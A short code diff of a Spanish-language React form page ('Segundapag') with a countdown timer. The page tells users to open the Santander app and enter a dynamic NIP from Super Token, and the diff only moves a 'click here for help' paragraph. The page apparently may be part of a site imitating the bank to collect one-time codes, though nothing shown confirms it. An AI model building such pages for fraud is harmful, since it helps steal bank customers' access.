@@ -71,15 +71,16 @@ function Segundapag() {
           Tiempo restante: {formatTime(timeLeft)}
         </div>
         <button type="submit" className="auth-continue-button" disabled={timeLeft === 0}>Continuar</button>
-        <p className="auth-info-text">
-          Si tienes problemas para obtener el NIP, <p>
-  Por favor, <u>da clic aquí</u>.
-</p>
         </p>
         <div className="instructions">
           <p style={{ fontSize: '12px', color: '#555' }}>1. Abre tu aplicación Santander.</p>
 <p style={{ fontSize: '12px', color: '#555' }}>2. En la parte de abajo selecciona la opción "Super Token".</p>
 <p style={{ fontSize: '12px', color: '#555' }}>3. Ingresa tu clave de Super Token para obtener el NIP dinámico.</p>
+
+          <p className="auth-info-text">
+          Si tienes problemas para obtener el NIP, <p>
+  Por favor, <u>da clic aquí</u>.
+</p>
         </div>
       </form>
     </div>
